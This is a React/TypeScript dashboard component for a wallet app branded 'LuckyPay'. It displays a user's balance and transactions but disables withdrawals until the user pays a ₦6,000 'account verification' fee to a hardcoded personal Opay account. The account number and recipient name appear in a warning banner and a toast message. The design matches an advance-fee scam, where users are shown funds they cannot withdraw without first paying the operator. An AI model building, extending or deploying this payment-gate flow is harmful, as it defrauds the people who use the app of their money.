import React, { useState, useEffect } from 'react';
import { Card, CardContent, CardDescription, CardHeader, CardTitle } from '@/components/ui/card';
import { Button } from '@/components/ui/button';
import { Badge } from '@/components/ui/badge';
import { useAuth } from '@/contexts/AuthContext';
import { supabase } from '@/integrations/supabase/client';
import { useToast } from '@/hooks/use-toast';
import { 
  Wallet, 
  Send, 
  Download, 
  History, 
  Shield, 
  AlertTriangle,
  Eye,
  EyeOff,
  LogOut,
  Receipt,
  ArrowUpRight,
  ArrowDownLeft
} from 'lucide-react';
import { formatCurrency } from '@/lib/utils';

interface Transaction {
  id: string;
  type: 'deposit' | 'withdrawal' | 'transfer' | 'verification_payment';
  amount: number;
  recipient_account?: string;
  recipient_name?: string;
  recipient_bank?: string;
  status: 'pending' | 'completed' | 'failed';
  reference: string;
  description?: string;
  created_at: string;
}

const Dashboard = () => {
  const { user, profile, signOut, refreshProfile } = useAuth();
  const [showBalance, setShowBalance] = useState(true);
  const [transactions, setTransactions] = useState<Transaction[]>([]);
  const [loading, setLoading] = useState(false);
  const { toast } = useToast();

  useEffect(() => {
    if (user) {
      fetchTransactions();
    }
  }, [user]);

  const fetchTransactions = async () => {
    try {
      const { data, error } = await supabase
        .from('transactions')
        .select('*')
        .eq('user_id', user?.id)
        .order('created_at', { ascending: false })
        .limit(10);

      if (error) throw error;
      setTransactions((data || []) as Transaction[]);
    } catch (error) {
      console.error('Error fetching transactions:', error);
    }
  };

  const handleVerificationPayment = async () => {
    if (!user || !profile) return;

    setLoading(true);
    try {
      // Create verification payment transaction
      const { error } = await supabase
        .from('transactions')
        .insert({
          user_id: user.id,
          type: 'verification_payment',
          amount: 6000,
          recipient_account: '9163110673',
          recipient_name: 'Abdullahi',
          recipient_bank: 'Opay',
          status: 'pending',
          description: 'Account verification payment to enable withdrawals'
        });

      if (error) throw error;

      toast({
        title: "Verification Payment Required",
        description: "Please pay ₦6,000 to Account: 9163110673 (Abdullahi - Opay) to verify your account and enable withdrawals.",
        variant: "default",
      });

      fetchTransactions();
      refreshProfile();
    } catch (error: any) {
      toast({
        title: "Error",
        description: error.message,
        variant: "destructive",
      });
    } finally {
      setLoading(false);
    }
  };

  const getTransactionIcon = (type: string) => {
    switch (type) {
      case 'deposit':
        return <ArrowDownLeft className="h-4 w-4 text-green-600" />;
      case 'withdrawal':
        return <ArrowUpRight className="h-4 w-4 text-red-600" />;
      case 'transfer':
        return <Send className="h-4 w-4 text-blue-600" />;
      case 'verification_payment':
        return <Shield className="h-4 w-4 text-orange-600" />;
      default:
        return <History className="h-4 w-4" />;
    }
  };

  const getStatusColor = (status: string) => {
    switch (status) {
      case 'completed':
        return 'bg-green-100 text-green-800';
      case 'pending':
        return 'bg-yellow-100 text-yellow-800';
      case 'failed':
        return 'bg-red-100 text-red-800';
      default:
        return 'bg-gray-100 text-gray-800';
    }
  };

  if (!profile) {
    return (
      <div className="min-h-screen bg-gradient-to-br from-background to-muted flex items-center justify-center">
        <div className="text-center">
          <div className="animate-spin rounded-full h-12 w-12 border-b-2 border-primary mx-auto mb-4"></div>
          <p>Loading your account...</p>
        </div>
      </div>
    );
  }

  return (
    <div className="min-h-screen bg-gradient-to-br from-background to-muted">
      {/* Header */}
      <div className="bg-card border-b">
        <div className="max-w-7xl mx-auto px-4 py-4">
          <div className="flex items-center justify-between">
            <div className="flex items-center gap-3">
              <div className="bg-primary text-primary-foreground p-2 rounded-full">
                <Wallet className="h-6 w-6" />
              </div>
              <div>
                <h1 className="text-2xl font-bold text-primary">LuckyPay</h1>
                <p className="text-sm text-muted-foreground">Welcome back, {profile.full_name || 'User'}</p>
              </div>
            </div>
            <Button variant="outline" size="sm" onClick={signOut}>
              <LogOut className="h-4 w-4 mr-2" />
              Sign Out
            </Button>
          </div>
        </div>
      </div>

      <div className="max-w-7xl mx-auto px-4 py-6">
        {/* Account Verification Alert */}
        {!profile.has_paid_verification && (
          <Card className="mb-6 border-orange-200 bg-orange-50">
            <CardContent className="pt-6">
              <div className="flex items-center gap-4">
                <div className="bg-orange-100 p-3 rounded-full">
                  <AlertTriangle className="h-6 w-6 text-orange-600" />
                </div>
                <div className="flex-1">
                  <h3 className="font-semibold text-orange-900">Account Verification Required</h3>
                  <p className="text-sm text-orange-700 mt-1">
                    Pay ₦6,000 to Account: 9163110673 (Abdullahi - Opay) to verify your account and enable withdrawals.
                  </p>
                </div>
                <Button 
                  onClick={handleVerificationPayment} 
                  disabled={loading}
                  className="bg-orange-600 hover:bg-orange-700"
                >
                  {loading ? 'Processing...' : 'Pay Now'}
                </Button>
              </div>
            </CardContent>
          </Card>
        )}

        <div className="grid grid-cols-1 lg:grid-cols-3 gap-6">
          {/* Balance Card */}
          <Card className="lg:col-span-2">
            <CardHeader>
              <div className="flex items-center justify-between">
                <div>
                  <CardTitle className="text-lg">Account Balance</CardTitle>
                  <CardDescription>Your current available balance</CardDescription>
                </div>
                <Button
                  variant="ghost"
                  size="sm"
                  onClick={() => setShowBalance(!showBalance)}
                >
                  {showBalance ? <EyeOff className="h-4 w-4" /> : <Eye className="h-4 w-4" />}
                </Button>
              </div>
            </CardHeader>
            <CardContent>
              <div className="text-4xl font-bold text-primary mb-4">
                {showBalance ? formatCurrency(profile.balance) : '₦***,***'}
              </div>
              <div className="flex gap-3">
                <Badge variant={profile.is_verified ? 'default' : 'secondary'} className="flex items-center gap-1">
                  <Shield className="h-3 w-3" />
                  {profile.is_verified ? 'Verified' : 'Unverified'}
                </Badge>
                <Badge variant={profile.has_paid_verification ? 'default' : 'destructive'}>
                  {profile.has_paid_verification ? 'Withdrawals Enabled' : 'Withdrawals Disabled'}
                </Badge>
              </div>
            </CardContent>
          </Card>

          {/* Quick Actions */}
          <Card>
            <CardHeader>
              <CardTitle className="text-lg">Quick Actions</CardTitle>
            </CardHeader>
            <CardContent className="space-y-3">
              <Button className="w-full justify-start" variant="outline">
                <Send className="h-4 w-4 mr-2" />
                Transfer Money
              </Button>
              <Button 
                className="w-full justify-start" 
                variant="outline"
                disabled={!profile.has_paid_verification}
              >
                <Download className="h-4 w-4 mr-2" />
                Withdraw Funds
              </Button>
              <Button className="w-full justify-start" variant="outline">
                <Receipt className="h-4 w-4 mr-2" />
                Generate Receipt
              </Button>
            </CardContent>
          </Card>
        </div>

        {/* Recent Transactions */}
        <Card className="mt-6">
          <CardHeader>
            <div className="flex items-center justify-between">
              <div>
                <CardTitle className="text-lg">Recent Transactions</CardTitle>
                <CardDescription>Your latest account activity</CardDescription>
              </div>
              <Button variant="outline" size="sm">
                <History className="h-4 w-4 mr-2" />
                View All
              </Button>
            </div>
          </CardHeader>
          <CardContent>
            {transactions.length === 0 ? (
              <div className="text-center py-8 text-muted-foreground">
                <History className="h-12 w-12 mx-auto mb-4 opacity-50" />
                <p>No transactions yet</p>
                <p className="text-sm">Your transaction history will appear here</p>
              </div>
            ) : (
              <div className="space-y-3">
                {transactions.map((transaction) => (
                  <div key={transaction.id} className="flex items-center justify-between p-3 border rounded-lg">
                    <div className="flex items-center gap-3">
                      {getTransactionIcon(transaction.type)}
                      <div>
                        <p className="font-medium capitalize">
                          {transaction.type.replace('_', ' ')}
                        </p>
                        <p className="text-sm text-muted-foreground">
                          {transaction.description || `${transaction.recipient_name} - ${transaction.recipient_bank}`}
                        </p>
                      </div>
                    </div>
                    <div className="text-right">
                      <p className="font-medium">
                        {transaction.type === 'deposit' ? '+' : '-'}{formatCurrency(transaction.amount)}
                      </p>
                      <Badge className={getStatusColor(transaction.status)} variant="secondary">
                        {transaction.status}
                      </Badge>
                    </div>
                  </div>
                ))}
              </div>
            )}
          </CardContent>
        </Card>
      </div>
    </div>
  );
};

export default Dashboard;